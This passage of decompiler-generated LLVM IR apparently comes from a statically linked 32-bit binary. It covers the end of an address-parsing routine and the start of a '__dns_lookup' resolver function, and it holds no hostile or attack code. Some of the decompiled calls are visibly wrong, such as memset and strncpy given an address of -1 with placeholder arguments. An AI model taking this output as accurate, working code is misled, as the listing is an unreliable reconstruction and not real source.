dec_label_pc_8052d12:                             ; preds = %dec_label_pc_8052d07, %dec_label_pc_8052d5b
  %v2_8052d5b34 = phi i32 [ 1, %dec_label_pc_8052d07 ], [ %v3_8052d5b, %dec_label_pc_8052d5b ]
  %v0_8052d1833 = phi i32 [ %v4_8052cff, %dec_label_pc_8052d07 ], [ %v0_8052d183, %dec_label_pc_8052d5b ]
  %v0_8052d7932 = phi i32 [ 0, %dec_label_pc_8052d07 ], [ %v2_8052d61, %dec_label_pc_8052d5b ]
  %v1_8052d18 = inttoptr i32 %v0_8052d1833 to i8*
  %v2_8052d18 = load i8, i8* %v1_8052d18, align 1
  %v3_8052d18 = sext i8 %v2_8052d18 to i32
  %v2_8052d1b = mul nsw i32 %v3_8052d18, 2
  %v3_8052d1b = add i32 %v2_8052d1b, %v0_8052d12.pre
  %v4_8052d1b = inttoptr i32 %v3_8052d1b to i8*
  %v5_8052d1b = load i8, i8* %v4_8052d1b, align 1
  %v6_8052d1b = and i8 %v5_8052d1b, 8
  %v7_8052d1b = icmp eq i8 %v6_8052d1b, 0
  br i1 %v7_8052d1b, label %dec_label_pc_8052d84, label %dec_label_pc_8052d22

dec_label_pc_8052d22:                             ; preds = %dec_label_pc_8052d12
  %v4_8052d36.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052d36

dec_label_pc_8052d26:                             ; preds = %dec_label_pc_8052d36
  %v3_8052d26 = mul i32 %v1_8052d26, 10
  %v2_8052d29 = add i32 %v3_8052d26, -48
  %v3_8052d29 = add i32 %v2_8052d29, %v2_8052d38
  %v1_8052d2d = add i32 %v3_8052d29, -255
  %v6_8052d2d = sub i32 254, %v3_8052d29
  %v7_8052d2d = and i32 %v6_8052d2d, %v3_8052d29
  %v8_8052d2d = icmp slt i32 %v7_8052d2d, 0
  %v9_8052d2d = icmp eq i32 %v1_8052d2d, 0
  %v10_8052d2d = icmp slt i32 %v1_8052d2d, 0
  %v3_8052d33 = icmp eq i1 %v10_8052d2d, %v8_8052d2d
  %v4_8052d33 = icmp eq i1 %v9_8052d2d, false
  %v5_8052d33 = and i1 %v4_8052d33, %v3_8052d33
  br i1 %v5_8052d33, label %dec_label_pc_8052d84, label %dec_label_pc_8052d35

dec_label_pc_8052d35:                             ; preds = %dec_label_pc_8052d26
  %v1_8052d35 = add i32 %v0_8052d35, 1
  store i32 %v1_8052d35, i32* @ecx, align 4
  br label %dec_label_pc_8052d36

dec_label_pc_8052d36:                             ; preds = %dec_label_pc_8052d22, %dec_label_pc_8052d35
  %v1_8052d26 = phi i32 [ 0, %dec_label_pc_8052d22 ], [ %v3_8052d29, %dec_label_pc_8052d35 ]
  %v4_8052d36 = phi i32 [ %v4_8052d36.pre, %dec_label_pc_8052d22 ], [ %v6_8052d36, %dec_label_pc_8052d35 ]
  %v0_8052d35 = phi i32 [ %v0_8052d1833, %dec_label_pc_8052d22 ], [ %v1_8052d35, %dec_label_pc_8052d35 ]
  %v1_8052d36 = inttoptr i32 %v0_8052d35 to i8*
  %v2_8052d36 = load i8, i8* %v1_8052d36, align 1
  %v3_8052d36 = zext i8 %v2_8052d36 to i32
  %v5_8052d36 = and i32 %v4_8052d36, -256
  %v6_8052d36 = or i32 %v3_8052d36, %v5_8052d36
  store i32 %v6_8052d36, i32* @edx, align 4
  %v2_8052d38 = sext i8 %v2_8052d36 to i32
  %v2_8052d3b = mul nsw i32 %v2_8052d38, 2
  %v3_8052d3b = add i32 %v2_8052d3b, %v0_8052d12.pre
  %v4_8052d3b = inttoptr i32 %v3_8052d3b to i16*
  %v5_8052d3b = load i16, i16* %v4_8052d3b, align 2
  %v2_8052d40 = and i16 %v5_8052d3b, 8
  %v3_8052d40 = icmp eq i16 %v2_8052d40, 0
  %v1_8052d42 = icmp eq i1 %v3_8052d40, false
  br i1 %v1_8052d42, label %dec_label_pc_8052d26, label %dec_label_pc_8052d44

dec_label_pc_8052d44:                             ; preds = %dec_label_pc_8052d36
  %v8_8052d44 = sub nsw i32 2, %v2_8052d5b34
  %v9_8052d44 = and i32 %v8_8052d44, %v2_8052d5b34
  %v10_8052d44 = icmp slt i32 %v9_8052d44, 0
  %v11_8052d44 = icmp eq i32 %v2_8052d5b34, 3
  %v12_8052d44 = icmp slt i32 %v2_8052d5b34, 3
  %v3_8052d48 = icmp eq i1 %v12_8052d44, %v10_8052d44
  %v4_8052d48 = icmp eq i1 %v11_8052d44, false
  %v5_8052d48 = and i1 %v4_8052d48, %v3_8052d48
  br i1 %v5_8052d48, label %dec_label_pc_8052d52, label %dec_label_pc_8052d4a

dec_label_pc_8052d4a:                             ; preds = %dec_label_pc_8052d44
  %v10_8052d4a = icmp eq i8 %v2_8052d36, 46
  %v1_8052d4d = icmp eq i1 %v10_8052d4a, false
  br i1 %v1_8052d4d, label %dec_label_pc_8052d84, label %dec_label_pc_8052d4f

dec_label_pc_8052d4f:                             ; preds = %dec_label_pc_8052d4a
  %v1_8052d4f = add i32 %v0_8052d35, 1
  store i32 %v1_8052d4f, i32* @ecx, align 4
  br label %dec_label_pc_8052d5b

dec_label_pc_8052d52:                             ; preds = %dec_label_pc_8052d44
  %v1_8052d52 = add i32 %v0_8052d35, 1
  store i32 %v1_8052d52, i32* @ecx, align 4
  %v4_8052d53 = icmp eq i8 %v2_8052d36, 0
  br i1 %v4_8052d53, label %dec_label_pc_8052d5b, label %dec_label_pc_8052d57

dec_label_pc_8052d57:                             ; preds = %dec_label_pc_8052d52
  %v2_8052d57 = and i16 %v5_8052d3b, 32
  %v3_8052d57 = icmp eq i16 %v2_8052d57, 0
  br i1 %v3_8052d57, label %dec_label_pc_8052d84, label %dec_label_pc_8052d5b

dec_label_pc_8052d5b:                             ; preds = %dec_label_pc_8052d57, %dec_label_pc_8052d52, %dec_label_pc_8052d4f
  %v0_8052d183 = phi i32 [ %v1_8052d52, %dec_label_pc_8052d57 ], [ %v1_8052d52, %dec_label_pc_8052d52 ], [ %v1_8052d4f, %dec_label_pc_8052d4f ]
  %v3_8052d5b = add nuw nsw i32 %v2_8052d5b34, 1
  %v2_8052d5e = mul i32 %v0_8052d7932, 256
  %v2_8052d61 = or i32 %v1_8052d26, %v2_8052d5e
  %v7_8052d67 = icmp sgt i32 %v2_8052d5b34, 3
  br i1 %v7_8052d67, label %dec_label_pc_8052d69, label %dec_label_pc_8052d12

dec_label_pc_8052d69:                             ; preds = %dec_label_pc_8052d5b
  %v4_8052d69 = icmp eq i32 %arg2, 0
  br i1 %v4_8052d69, label %dec_label_pc_8052d86, label %dec_label_pc_8052d75

dec_label_pc_8052d75:                             ; preds = %dec_label_pc_8052d69
  %v1_8052d79 = call i32 @llvm.bswap.i32(i32 %v2_8052d61)
  %v2_8052d7b = inttoptr i32 %arg2 to i32*
  store i32 %v1_8052d79, i32* %v2_8052d7b, align 4
  br label %dec_label_pc_8052d86

dec_label_pc_8052d84:                             ; preds = %dec_label_pc_8052d57, %dec_label_pc_8052d4a, %dec_label_pc_8052d12, %dec_label_pc_8052d26, %entry
  br label %dec_label_pc_8052d86

dec_label_pc_8052d86:                             ; preds = %dec_label_pc_8052d69, %dec_label_pc_8052d75, %dec_label_pc_8052d84
  %v0_8052d8b = phi i32 [ 1, %dec_label_pc_8052d69 ], [ 1, %dec_label_pc_8052d75 ], [ 0, %dec_label_pc_8052d84 ]
  ret i32 %v0_8052d8b

; uselistorder directives
  uselistorder i32 %v2_8052d38, { 1, 0 }
  uselistorder i32 %v6_8052d36, { 1, 0 }
  uselistorder i8 %v2_8052d36, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052d35, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8052d2d, { 1, 0 }
  uselistorder i32 %v3_8052d29, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8052d1833, { 1, 0 }
  uselistorder i32 %v2_8052d5b34, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052d86, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052d84, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8052d36, { 1, 0 }
  uselistorder label %dec_label_pc_8052d12, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8052da2 = call i32 @malloc(i32 512)
  store i32 %v2_8052da2, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8052da2, i32* @ebp, align 4
  %v2_8052db0 = call i32 @malloc(i32 1025)
  store i32 %v2_8052db0, i32* %eax.global-to-local, align 4
  %v12_8052db9 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8052dbc = icmp eq i32 %v2_8052da2, 0
  br i1 %v1_8052dbc, label %dec_label_pc_8053435, label %dec_label_pc_8052dc4

dec_label_pc_8052dc4:                             ; preds = %entry
  %v1_8052dc4 = icmp eq i32 %v2_8052db0, 0
  br i1 %v1_8052dc4, label %dec_label_pc_8053435, label %dec_label_pc_8052dcc

dec_label_pc_8052dcc:                             ; preds = %dec_label_pc_8052dc4
  %v5_8052dcc = icmp eq i32 %arg2, 0
  br i1 %v5_8052dcc, label %dec_label_pc_8053435, label %dec_label_pc_8052dda

dec_label_pc_8052dda:                             ; preds = %dec_label_pc_8052dcc
  %v4_8052dda = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052dda, i32* %eax.global-to-local, align 4
  %v2_8052de1 = load i8, i8* %arg1, align 1
  %v3_8052de1 = icmp eq i8 %v2_8052de1, 0
  br i1 %v3_8052de1, label %dec_label_pc_8053435, label %dec_label_pc_8052dea

dec_label_pc_8052dea:                             ; preds = %dec_label_pc_8052dda
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8052dee = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8052dee, i32* @eax, align 4
  store i32 %v4_8052dda, i32* %edx.global-to-local, align 4
  %v2_8052e11 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8052e11, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052e19 = call i32 @__pthread_return_void(i32 %v2_8052e11, i32 134552147)
  store i32 %v3_8052e19, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_805e728.231 to i8*), i8** %stack_var_-252, align 4
  %v2_8052e25 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_805e728.231 to i32))
  %v0_8052e2a = load i64, i64* @global_var_805e740.232, align 8
  %v1_8052e2a = trunc i64 %v0_8052e2a to i32
  %v1_8052e2f = ashr i32 %v1_8052e2a, 31
  %v6_8052e30 = and i64 %v0_8052e2a, 4294967295
  %v8_8052e30 = zext i32 %v1_8052e2f to i64
  %v9_8052e30 = mul nuw i64 %v8_8052e30, 4294967296
  %v10_8052e30 = or i64 %v9_8052e30, %v6_8052e30
  %v14_8052e30 = srem i64 %v10_8052e30, %tmp33
  %v15_8052e30 = trunc i64 %v14_8052e30 to i32
  %v0_8052e37 = load i16, i16* @global_var_8058484.233, align 4
  %v2_8052e46 = load i8*, i8** %stack_var_-252, align 4
  %v3_8052e46 = ptrtoint i8* %v2_8052e46 to i32
  store i32 %v3_8052e46, i32* @eax, align 4
  store i32 134552147, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052e4b = call i32 @__pthread_return_void(i32 %v2_8052e11, i32 1)
  store i32 %v3_8052e4b, i32* %eax.global-to-local, align 4
  %v4_8052ff2 = inttoptr i32 %v15_8052e30 to i8*
  %v1_805341072 = add i32 %v12_8052db9, 28
  %v2_805341073 = inttoptr i32 %v1_805341072 to i32*
  %v3_805341074 = load i32, i32* %v2_805341073, align 4
  %tmp = icmp ult i32 %v3_805341074, 3
  br i1 %tmp, label %dec_label_pc_8052e70, label %dec_label_pc_8053435

dec_label_pc_8052e70:                             ; preds = %dec_label_pc_8052dea, %dec_label_pc_8053410.backedge
  %v0_8052e7783 = phi i32 [ %v0_8053410.pre, %dec_label_pc_8053410.backedge ], [ %v12_8052db9, %dec_label_pc_8052dea ]
  %v1_8052e70 = add i32 %v0_8052e7783, 20
  %v2_8052e70 = inttoptr i32 %v1_8052e70 to i32*
  %v3_8052e70 = load i32, i32* %v2_8052e70, align 4
  %v13_8052e70 = icmp eq i32 %v3_8052e70, -1
  br i1 %v13_8052e70, label %dec_label_pc_8052e70.dec_label_pc_8052e86_crit_edge, label %dec_label_pc_8052e77

dec_label_pc_8052e70.dec_label_pc_8052e86_crit_edge: ; preds = %dec_label_pc_8052e70
  %v0_8052e86.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e86

dec_label_pc_8052e77:                             ; preds = %dec_label_pc_8052e70
  %v3_8052e7a = load i32, i32* %v2_8052e70, align 4
  %v5_8052e7a = add i32 %v0_8052e7783, -16
  %v6_8052e7a = inttoptr i32 %v5_8052e7a to i32*
  store i32 %v3_8052e7a, i32* %v6_8052e7a, align 4
  %v1_8052e7e = call i32 @__libc_close(i32 -1)
  store i32 %v1_8052e7e, i32* %eax.global-to-local, align 4
  %v0_8052e83 = load i32, i32* @esp, align 4
  %v1_8052e83 = add i32 %v0_8052e83, 16
  br label %dec_label_pc_8052e86

dec_label_pc_8052e86:                             ; preds = %dec_label_pc_8052e70.dec_label_pc_8052e86_crit_edge, %dec_label_pc_8052e77
  %v1_8052e86 = phi i32 [ %v0_8052e7783, %dec_label_pc_8052e70.dec_label_pc_8052e86_crit_edge ], [ %v1_8052e83, %dec_label_pc_8052e77 ]
  %v0_8052e86 = phi i32 [ %v0_8052e86.pre, %dec_label_pc_8052e70.dec_label_pc_8052e86_crit_edge ], [ %v1_8052e7e, %dec_label_pc_8052e77 ]
  %v2_8052e86 = add i32 %v1_8052e86, -4
  %v3_8052e86 = inttoptr i32 %v2_8052e86 to i32*
  store i32 %v0_8052e86, i32* %v3_8052e86, align 4
  %v1_8052e87 = add i32 %v1_8052e86, -8
  %v2_8052e87 = inttoptr i32 %v1_8052e87 to i32*
  store i32 512, i32* %v2_8052e87, align 4
  %v1_8052e8c = add i32 %v1_8052e86, -12
  %v2_8052e8c = inttoptr i32 %v1_8052e8c to i32*
  store i32 0, i32* %v2_8052e8c, align 4
  %v2_8052e8e = add i32 %v1_8052e86, -16
  %v3_8052e8e = inttoptr i32 %v2_8052e8e to i32*
  store i32 %v2_8052da2, i32* %v3_8052e8e, align 4
  %v4_8052e8f = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052e8f, i32* %eax.global-to-local, align 4
  %v0_8052e94 = load i32, i32* @esp, align 4
  %v1_8052e97 = add i32 %v0_8052e94, 8
  %v2_8052e97 = inttoptr i32 %v1_8052e97 to i32*
  store i32 48, i32* %v2_8052e97, align 4
  %v1_8052e99 = add i32 %v0_8052e94, 4
  %v2_8052e99 = inttoptr i32 %v1_8052e99 to i32*
  store i32 0, i32* %v2_8052e99, align 4
  %v1_8052e9b = add i32 %v0_8052e94, 84
  store i32 %v1_8052e9b, i32* @ebx, align 4
  %v3_8052e9f = inttoptr i32 %v0_8052e94 to i32*
  store i32 %v1_8052e9b, i32* %v3_8052e9f, align 4
  %v4_8052ea0 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052ea0, i32* %eax.global-to-local, align 4
  %v0_8052ea5 = load i32, i32* @esp, align 4
  %v1_8052ea5 = add i32 %v0_8052ea5, 72
  %v2_8052ea5 = inttoptr i32 %v1_8052ea5 to i32*
  %v3_8052ea5 = load i32, i32* %v2_8052ea5, align 4
  store i32 %v3_8052ea5, i32* %eax.global-to-local, align 4
  %v1_8052ea9 = add i32 %v0_8052ea5, 116
  %v2_8052ea9 = inttoptr i32 %v1_8052ea9 to i32*
  store i32 1, i32* %v2_8052ea9, align 4
  %v0_8052eb1 = load i32, i32* @esp, align 4
  %v1_8052eb1 = add i32 %v0_8052eb1, 104
  %v2_8052eb1 = inttoptr i32 %v1_8052eb1 to i32*
  store i32 1, i32* %v2_8052eb1, align 4
  %v0_8052eb9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052eb9 = add i32 %v0_8052eb9, 1
  %v1_8052eba = urem i32 %v1_8052eb9, 65536
  store i32 %v1_8052eba, i32* %eax.global-to-local, align 4
  %v1_8052ebf = load i32, i32* @esp, align 4
  %v2_8052ebf = add i32 %v1_8052ebf, 72
  %v3_8052ebf = inttoptr i32 %v2_8052ebf to i32*
  store i32 %v1_8052eba, i32* %v3_8052ebf, align 4
  %v0_8052ec3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ec3 = load i32, i32* @esp, align 4
  %v2_8052ec3 = add i32 %v1_8052ec3, 84
  %v3_8052ec3 = inttoptr i32 %v2_8052ec3 to i32*
  store i32 %v0_8052ec3, i32* %v3_8052ec3, align 4
  %v0_8052ec7 = load i32, i32* @esp, align 4
  %v1_8052eca = add i32 %v0_8052ec7, 8
  %v2_8052eca = inttoptr i32 %v1_8052eca to i32*
  store i32 512, i32* %v2_8052eca, align 4
  %v2_8052ecf = add i32 %v0_8052ec7, 4
  %v3_8052ecf = inttoptr i32 %v2_8052ecf to i32*
  store i32 %v2_8052da2, i32* %v3_8052ecf, align 4
  %v0_8052ed0 = load i32, i32* @ebx, align 4
  %v3_8052ed0 = inttoptr i32 %v0_8052ec7 to i32*
  store i32 %v0_8052ed0, i32* %v3_8052ed0, align 4
  %v0_8052ed1 = call i32 @__encode_header()
  store i32 %v0_8052ed1, i32* %eax.global-to-local, align 4
  %v0_8052ed6 = load i32, i32* @esp, align 4
  %v2_8052ed9 = icmp slt i32 %v0_8052ed1, 0
  store i32 %v0_8052ed1, i32* @ebx, align 4
  br i1 %v2_8052ed9, label %dec_label_pc_8053435, label %dec_label_pc_8052ee3

dec_label_pc_8052ee3:                             ; preds = %dec_label_pc_8052e86
  %v2_8052ee3 = add i32 %v0_8052ed6, 12
  %v3_8052ee3 = inttoptr i32 %v2_8052ee3 to i32*
  store i32 %v0_8052ed1, i32* %v3_8052ee3, align 4
  %v1_8052ee4 = add i32 %v0_8052ed6, 8
  %v2_8052ee4 = inttoptr i32 %v1_8052ee4 to i32*
  store i32 1025, i32* %v2_8052ee4, align 4
  %v1_8052ee9 = add i32 %v0_8052ed6, 256
  %v2_8052ee9 = inttoptr i32 %v1_8052ee9 to i32*
  %v3_8052ee9 = load i32, i32* %v2_8052ee9, align 4
  %v5_8052ee9 = add i32 %v0_8052ed6, 4
  %v6_8052ee9 = inttoptr i32 %v5_8052ee9 to i32*
  store i32 %v3_8052ee9, i32* %v6_8052ee9, align 4
  %v1_8052ef0 = add i32 %v0_8052ed6, 28
  %v2_8052ef0 = inttoptr i32 %v1_8052ef0 to i32*
  %v3_8052ef0 = load i32, i32* %v2_8052ef0, align 4
  %v6_8052ef0 = inttoptr i32 %v0_8052ed6 to i32*
  store i32 %v3_8052ef0, i32* %v6_8052ef0, align 4
  %v4_8052ef4 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  %v0_8052ef9 = load i32, i32* @esp, align 4
  %v1_8052efc = add i32 %v0_8052ef9, 8
  %v2_8052efc = inttoptr i32 %v1_8052efc to i32*
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %v2_8052efc, align 4
  %v1_8052f01 = add i32 %v0_8052ef9, 4
  %v2_8052f01 = inttoptr i32 %v1_8052f01 to i32*
  store i32 134552147, i32* %v2_8052f01, align 4
  %v1_8052f06 = add i32 %v0_8052ef9, 200
  store i32 %v1_8052f06, i32* @eax, align 4
  %v3_8052f0d = inttoptr i32 %v0_8052ef9 to i32*
  store i32 %v1_8052f06, i32* %v3_8052f0d, align 4
  %v2_8052f0e = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_8052f0e, i32* %eax.global-to-local, align 4
  %v0_8052f13 = load i32, i32* @esp, align 4
  %v1_8052f13 = inttoptr i32 %v0_8052f13 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %v1_8052f13, align 4
  %v1_8052f1a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052f1a, i32* %eax.global-to-local, align 4
  %v0_8052f1f = load i32, i32* @esp, align 4
  %v1_8052f1f = add i32 %v0_8052f1f, 56
  %v2_8052f1f = inttoptr i32 %v1_8052f1f to i32*
  %v3_8052f1f = load i32, i32* %v2_8052f1f, align 4
  store i32 %v3_8052f1f, i32* %edx.global-to-local, align 4
  %v1_8052f23 = add i32 %v0_8052f1f, 268
  %v2_8052f23 = inttoptr i32 %v1_8052f23 to i32*
  %v3_8052f23 = load i32, i32* %v2_8052f23, align 4
  store i32 %v3_8052f23, i32* %eax.global-to-local, align 4
  %v2_8052f2a = mul i32 %v3_8052f1f, 4
  %v3_8052f2a = add i32 %v3_8052f23, %v2_8052f2a
  %v4_8052f2a = inttoptr i32 %v3_8052f2a to i32*
  %v5_8052f2a = load i32, i32* %v4_8052f2a, align 4
  store i32 %v5_8052f2a, i32* %edx.global-to-local, align 4
  %v2_8052f2d = add i32 %v0_8052f1f, 48
  %v3_8052f2d = inttoptr i32 %v2_8052f2d to i32*
  store i32 %v5_8052f2a, i32* %v3_8052f2d, align 4
  %v0_8052f31 = load i32, i32* @esp, align 4
  %v1_8052f31 = add i32 %v0_8052f31, 16
  %v1_8052f34 = add i32 %v0_8052f31, 52
  %v2_8052f34 = inttoptr i32 %v1_8052f34 to i32*
  %v3_8052f34 = load i32, i32* %v2_8052f34, align 4
  %v5_8052f34 = icmp slt i32 %v3_8052f34, 0
  br i1 %v5_8052f34, label %dec_label_pc_8052ee3.dec_label_pc_8052f7a_crit_edge, label %dec_label_pc_8052f3b

dec_label_pc_8052ee3.dec_label_pc_8052f7a_crit_edge: ; preds = %dec_label_pc_8052ee3
  %v0_8052f7a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f7a

dec_label_pc_8052f3b:                             ; preds = %dec_label_pc_8052ee3
  store i32 %v3_8052f34, i32* %eax.global-to-local, align 4
  %v1_8052f3f = load i32, i32* @global_var_805eb78.234, align 8
  %v2_8052f3f = sub i32 %v3_8052f34, %v1_8052f3f
  %v8_8052f3f = xor i32 %v1_8052f3f, %v3_8052f34
  %v9_8052f3f = xor i32 %v2_8052f3f, %v3_8052f34
  %v10_8052f3f = and i32 %v9_8052f3f, %v8_8052f3f
  %v11_8052f3f = icmp slt i32 %v10_8052f3f, 0
  %v13_8052f3f = icmp slt i32 %v2_8052f3f, 0
  %v2_8052f45 = icmp eq i1 %v13_8052f3f, %v11_8052f3f
  br i1 %v2_8052f45, label %dec_label_pc_8052f7a, label %dec_label_pc_8052f47

dec_label_pc_8052f47:                             ; preds = %dec_label_pc_8052f3b
  %v2_8052f47 = add i32 %v0_8052f31, 12
  %v3_8052f47 = inttoptr i32 %v2_8052f47 to i32*
  store i32 %v3_8052f34, i32* %v3_8052f47, align 4
  %v1_8052f48 = add i32 %v0_8052f31, 8
  %v2_8052f48 = inttoptr i32 %v1_8052f48 to i32*
  store i32 1025, i32* %v2_8052f48, align 4
  %v1_8052f4d = add i32 %v0_8052f31, 4
  %v2_8052f4d = inttoptr i32 %v1_8052f4d to i32*
  store i32 ptrtoint (i32* @global_var_8057a1c.235 to i32), i32* %v2_8052f4d, align 4
  %v1_8052f52 = add i32 %v0_8052f31, 28
  %v2_8052f52 = inttoptr i32 %v1_8052f52 to i32*
  %v3_8052f52 = load i32, i32* %v2_8052f52, align 4
  %v6_8052f52 = inttoptr i32 %v0_8052f31 to i32*
  store i32 %v3_8052f52, i32* %v6_8052f52, align 4
  %v0_8052f56 = call i32 @__GI_strncat()
  store i32 %v0_8052f56, i32* %eax.global-to-local, align 4
  %v0_8052f5b = load i32, i32* @esp, align 4
  %v1_8052f5e = add i32 %v0_8052f5b, 8
  %v2_8052f5e = inttoptr i32 %v1_8052f5e to i32*
  store i32 1025, i32* %v2_8052f5e, align 4
  %v1_8052f63 = add i32 %v0_8052f5b, 52
  %v2_8052f63 = inttoptr i32 %v1_8052f63 to i32*
  %v3_8052f63 = load i32, i32* %v2_8052f63, align 4
  store i32 %v3_8052f63, i32* %edx.global-to-local, align 4
  %v1_8052f67 = mul i32 %v3_8052f63, 4
  %v2_8052f67 = add i32 %v1_8052f67, 134605656
  %v3_8052f67 = inttoptr i32 %v2_8052f67 to i32*
  %v4_8052f67 = load i32, i32* %v3_8052f67, align 4
  %v6_8052f67 = add i32 %v0_8052f5b, 4
  %v7_8052f67 = inttoptr i32 %v6_8052f67 to i32*
  store i32 %v4_8052f67, i32* %v7_8052f67, align 4
  %v1_8052f6e = add i32 %v0_8052f5b, 28
  %v2_8052f6e = inttoptr i32 %v1_8052f6e to i32*
  %v3_8052f6e = load i32, i32* %v2_8052f6e, align 4
  %v6_8052f6e = inttoptr i32 %v0_8052f5b to i32*
  store i32 %v3_8052f6e, i32* %v6_8052f6e, align 4
  %v0_8052f72 = call i32 @__GI_strncat()
  store i32 %v0_8052f72, i32* %eax.global-to-local, align 4
  %v0_8052f77 = load i32, i32* @esp, align 4
  %v1_8052f77 = add i32 %v0_8052f77, 16
  br label %dec_label_pc_8052f7a

dec_label_pc_8052f7a:                             ; preds = %dec_label_pc_8052ee3.dec_label_pc_8052f7a_crit_edge, %dec_label_pc_8052f3b, %dec_label_pc_8052f47
  %v1_8052f7a = phi i32 [ %v1_8052f31, %dec_label_pc_8052ee3.dec_label_pc_8052f7a_crit_edge ], [ %v1_8052f31, %dec_label_pc_8052f3b ], [ %v1_8052f77, %dec_label_pc_8052f47 ]
  %v0_8052f7a = phi i32 [ %v0_8052f7a.pre, %dec_label_pc_8052ee3.dec_label_pc_8052f7a_crit_edge ], [ %v3_8052f34, %dec_label_pc_8052f3b ], [ %v0_8052f72, %dec_label_pc_8052f47 ]
  %v2_8052f7a = add i32 %v1_8052f7a, -4
  %v3_8052f7a = inttoptr i32 %v2_8052f7a to i32*
  store i32 %v0_8052f7a, i32* %v3_8052f7a, align 4
  %v0_8052f7b = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f7b = add i32 %v1_8052f7a, -8
  %v3_8052f7b = inttoptr i32 %v2_8052f7b to i32*
  store i32 %v0_8052f7b, i32* %v3_8052f7b, align 4
  %v1_8052f7c = add i32 %v1_8052f7a, -12
  %v2_8052f7c = inttoptr i32 %v1_8052f7c to i32*
  store i32 1, i32* %v2_8052f7c, align 4
  %v1_8052f7e = add i32 %v1_8052f7a, 184
  store i32 %v1_8052f7e, i32* @eax, align 4
  %v2_8052f85 = add i32 %v1_8052f7a, -16
  %v3_8052f85 = inttoptr i32 %v2_8052f85 to i32*
  store i32 %v1_8052f7e, i32* %v3_8052f85, align 4
  %v2_8052f86 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_8052f86, i32* %eax.global-to-local, align 4
  %v0_8052f8b = load i32, i32* @esp, align 4
  %v1_8052f8b = add i32 %v0_8052f8b, 28
  %v2_8052f8b = inttoptr i32 %v1_8052f8b to i32*
  %v3_8052f8b = load i32, i32* %v2_8052f8b, align 4
  store i32 %v3_8052f8b, i32* %eax.global-to-local, align 4
  %v1_8052f8f = add i32 %v0_8052f8b, 260
  %v2_8052f8f = inttoptr i32 %v1_8052f8f to i32*
  %v3_8052f8f = load i32, i32* %v2_8052f8f, align 4
  store i32 %v3_8052f8f, i32* @edx, align 4
  %v1_8052f96 = add i32 %v0_8052f8b, 224
  %v2_8052f96 = inttoptr i32 %v1_8052f96 to i32*
  store i32 1, i32* %v2_8052f96, align 4
  %v0_8052fa1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052fa1 = load i32, i32* @esp, align 4
  %v2_8052fa1 = add i32 %v1_8052fa1, 216
  %v3_8052fa1 = inttoptr i32 %v2_8052fa1 to i32*
  store i32 %v0_8052fa1, i32* %v3_8052fa1, align 4
  %v1_8052fad = load i32, i32* @ebx, align 4
  %v2_8052fad = sub i32 512, %v1_8052fad
  store i32 %v2_8052fad, i32* %eax.global-to-local, align 4
  %v0_8052faf = load i32, i32* @edx, align 4
  %v1_8052faf = load i32, i32* @esp, align 4
  %v2_8052faf = add i32 %v1_8052faf, 220
  %v3_8052faf = inttoptr i32 %v2_8052faf to i32*
  store i32 %v0_8052faf, i32* %v3_8052faf, align 4
  %v0_8052fb6 = load i32, i32* @esp, align 4
  %v0_8052fb9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052fb9 = add i32 %v0_8052fb6, 8
  %v3_8052fb9 = inttoptr i32 %v2_8052fb9 to i32*
  store i32 %v0_8052fb9, i32* %v3_8052fb9, align 4
  %v1_8052fba = load i32, i32* @ebx, align 4
  %v2_8052fba = add i32 %v1_8052fba, %v2_8052da2
  %v2_8052fbe = add i32 %v0_8052fb6, 4
